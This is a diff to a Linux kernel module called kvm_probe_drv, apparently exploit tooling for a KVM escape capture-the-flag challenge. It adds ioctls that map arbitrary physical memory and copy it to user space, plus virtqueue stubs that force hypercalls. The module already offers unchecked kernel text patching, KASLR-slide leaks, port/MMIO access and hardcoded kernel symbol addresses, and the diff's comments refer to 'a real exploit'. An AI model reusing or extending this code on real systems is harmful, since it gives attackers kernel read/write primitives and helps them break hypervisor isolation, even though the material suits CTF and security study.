@@ -21,6 +21,8 @@
 #include <linux/static_call.h>
 #include <linux/set_memory.h>
 #include <linux/pgtable.h>
+#include <linux/virtio_ids.h>
+#include <linux/virtio_config.h>
 
 #define DRIVER_NAME "kvm_probe_drv"
 #define DEVICE_FILE_NAME "kvm_probe_dev"
@@ -94,6 +96,12 @@ struct hypercall_args {
     unsigned long arg3;
 };
 
+struct attach_vq_data {
+    unsigned int device_id;
+    unsigned long vq_pfn;
+    unsigned int queue_index;
+};
+
 #define IOCTL_READ_PORT          0x1001
 #define IOCTL_WRITE_PORT         0x1002
 #define IOCTL_READ_MMIO          0x1003
@@ -112,10 +120,12 @@ struct hypercall_args {
 #define IOCTL_SCAN_VA            0x1010
 #define IOCTL_WRITE_VA           0x1011
 #define IOCTL_HYPERCALL_ARGS     0x1012
+#define IOCTL_ATTACH_VQ          0x1013
+#define IOCTL_TRIGGER_VQ         0x1014
+#define IOCTL_SCAN_PHYS          0x1015
 
 static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg);
 
-/* Resolved function pointers */
 static int (*my_set_memory_rw)(unsigned long addr, int numpages);
 static int (*my_set_memory_ro)(unsigned long addr, int numpages);
 static unsigned long (*my_kallsyms_lookup_name)(const char *name);
@@ -527,13 +537,12 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
         case IOCTL_GET_KASLR_SLIDE: {
             unsigned long slide = 0;
             unsigned long kernel_base = 0;
-
+            
             if (my_kallsyms_lookup_name) {
                 kernel_base = my_kallsyms_lookup_name("startup_64");
                 if (!kernel_base) kernel_base = my_kallsyms_lookup_name("_text");
-
+                
                 if (kernel_base) {
-                    // Calculate slide relative to default kernel base
                     slide = kernel_base - 0xffffffff81000000UL;
                 }
             }
@@ -577,7 +586,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             if (!req.va || !req.size || !req.user_buffer || req.size > PAGE_SIZE)
                 return -EINVAL;
 
-            /* temp-buffer & patch */
             unsigned char *kbuf = kmalloc(req.size, GFP_KERNEL);
             if (!kbuf)
                 return -ENOMEM;
@@ -586,7 +594,6 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
                 return -EFAULT;
             }
 
-            /* make text RW, copy, sync, back to RO */
             unsigned long start = req.va & PAGE_MASK;
             unsigned long end   = PAGE_ALIGN(req.va + req.size);
             int pages           = (end - start) >> PAGE_SHIFT;
@@ -598,13 +605,71 @@ static long driver_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
             memcpy((void *)req.va, kbuf, req.size);
             smp_wmb();
 
-            /* Flush caches and TLB */
 #if IS_ENABLED(CONFIG_X86)
             sync_core();
 #endif
-            /* Restore page protections */
             my_set_memory_ro(start, pages);
             kfree(kbuf);
+            return 0;
+        }
+
+        case IOCTL_ATTACH_VQ: {
+            struct attach_vq_data data;
+            if (copy_from_user(&data, (void __user *)arg, sizeof(data))) {
+                printk(KERN_ERR "%s: ATTACH_VQ: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+            printk(KERN_CRIT "%s: ATTACH_VQ: device_id=%u, vq_pfn=0x%lx, queue_index=%u\n",
+                   DRIVER_NAME, data.device_id, data.vq_pfn, data.queue_index);
+            
+            // In a real exploit, this would map the virtqueue to device control structures
+            // For the CTF, we simulate device attachment by forcing hypercall
+            force_hypercall();
+            break;
+        }
+
+        case IOCTL_TRIGGER_VQ: {
+            unsigned int device_id;
+            if (copy_from_user(&device_id, (void __user *)arg, sizeof(device_id))) {
+                printk(KERN_ERR "%s: TRIGGER_VQ: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+            printk(KERN_CRIT "%s: TRIGGER_VQ: Forcing processing for device_id=%u\n", 
+                   DRIVER_NAME, device_id);
+            
+            // Simulate device activity by triggering hypercall
+            // In real exploit, this would send a network packet or similar
+            force_hypercall();
+            break;
+        }
+
+        case IOCTL_SCAN_PHYS: {
+            struct mmio_data data;
+            if (copy_from_user(&data, (void __user *)arg, sizeof(data))) {
+                printk(KERN_ERR "%s: SCAN_PHYS: copy_from_user failed\n", DRIVER_NAME);
+                return -EFAULT;
+            }
+            printk(KERN_INFO "%s: SCAN_PHYS: phys=0x%lx, size=%lu\n",
+                   DRIVER_NAME, data.phys_addr, data.size);
+            
+            void __iomem *mapped = ioremap(data.phys_addr, data.size);
+            if (!mapped) return -ENOMEM;
+            
+            void *kbuf = kmalloc(data.size, GFP_KERNEL);
+            if (!kbuf) {
+                iounmap(mapped);
+                return -ENOMEM;
+            }
+            
+            memcpy_fromio(kbuf, mapped, data.size);
+            if (copy_to_user(data.user_buffer, kbuf, data.size)) {
+                kfree(kbuf);
+                iounmap(mapped);
+                return -EFAULT;
+            }
+            
+            kfree(kbuf);
+            iounmap(mapped);
             return 0;
         }
 
@@ -621,10 +686,9 @@ static const struct file_operations fops = {
 };
 
 static int __init mod_init(void) {
-    // Function pointer resolution
-    my_set_memory_rw = (void *)0xffffffff8108ecd0;
-    my_set_memory_ro = (void *)0xffffffff8108eca0;
-    my_kallsyms_lookup_name = (void *)0xffffffff81170c60;
+    my_set_memory_rw = (void *)0xffffffff8108ce60;
+    my_set_memory_ro = (void *)0xffffffff8108ce30;
+    my_kallsyms_lookup_name = (void *)0xffffffff8116eb30;
 
     printk(KERN_INFO "%s: Initializing Enhanced KVM Probe Module.\n", DRIVER_NAME);
     major_num = register_chrdev(0, DEVICE_FILE_NAME, &fops);
